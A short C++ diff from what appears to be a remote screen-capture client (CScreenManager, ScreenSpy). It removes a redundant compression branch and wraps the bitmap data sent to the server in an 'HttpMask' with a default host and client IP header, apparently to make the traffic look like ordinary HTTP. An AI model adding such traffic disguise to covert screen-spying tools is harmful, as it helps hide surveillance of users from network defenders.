@@ -205,8 +205,6 @@ DWORD WINAPI CScreenManager::WorkThreadProc(LPVOID lParam)
 	This->SendFirstScreen();
 #if USING_ZLIB
 	const int fps = 8;// 帧率
-#elif USING_LZ4
-	const int fps = 8;// 帧率
 #else
 	const int fps = 8;// 帧率
 #endif
@@ -268,7 +266,8 @@ VOID CScreenManager::SendBitMapInfo()
 	szBuffer[0] = TOKEN_BITMAPINFO;
 	//这里将bmp位图结构发送出去
 	memcpy(szBuffer + 1, m_ScreenSpyObject->GetBIData(), ulLength - 1);
-	m_ClientObject->Send2Server((char*)szBuffer, ulLength);
+	HttpMask mask(DEFAULT_HOST, m_ClientObject->GetClientIPHeader());
+	m_ClientObject->Send2Server((char*)szBuffer, ulLength, &mask);
 	VirtualFree(szBuffer, 0, MEM_RELEASE);
 }
 
